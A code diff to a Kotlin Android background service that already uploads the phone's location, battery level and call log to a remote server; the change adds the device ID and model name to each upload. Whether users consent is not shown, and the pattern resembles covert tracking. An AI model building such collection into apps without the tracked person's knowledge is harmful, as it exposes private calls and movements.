@@ -12,6 +12,7 @@ import android.os.Build
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
+import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import android.content.pm.PackageManager
@@ -143,6 +144,8 @@ class LocationService : Service() {
         val accuracy = location.accuracy
         val batteryLevel = getBatteryLevel()
         val calls = getCallLog()
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+        val deviceName = Build.MODEL ?: "Unknown Device"
 
         lastSentLocation = location
         lastSentTime = System.currentTimeMillis()
@@ -165,11 +168,13 @@ class LocationService : Service() {
                     put("accuracy", accuracy)
                     put("battery", batteryLevel)
                     put("calls", calls)
+                    put("device_id", deviceId)
+                    put("device_name", deviceName)
                 }
                 conn.outputStream.write(json.toString().toByteArray())
 
                 val response = conn.responseCode
-                Log.d(TAG, "Sent: $latitude,$longitude calls=${calls.length()} (HTTP $response)")
+                Log.d(TAG, "Sent: $latitude,$longitude calls=${calls.length()} device=$deviceName (HTTP $response)")
                 conn.disconnect()
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to send location", e)
